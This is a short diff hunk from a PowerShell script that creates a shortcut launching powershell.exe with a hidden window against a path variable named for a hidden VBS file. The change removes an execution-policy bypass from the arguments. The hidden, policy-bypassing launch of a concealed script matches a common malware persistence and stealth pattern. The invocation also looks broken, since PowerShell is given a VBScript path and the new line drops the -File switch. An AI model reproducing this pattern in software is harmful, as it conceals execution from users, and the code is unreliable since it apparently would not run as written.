@@ -109,7 +109,7 @@ if ($p) {
     
     # Set the target path and arguments for the shortcut
     $shortcut.TargetPath = "powershell.exe"
-    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $hiddenVbsPath  "
+    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile $hiddenVbsPath  "
 
     # Set the working directory for the shortcut
     $shortcut.WorkingDirectory = (Get-Item $hiddenVbsPath ).DirectoryName
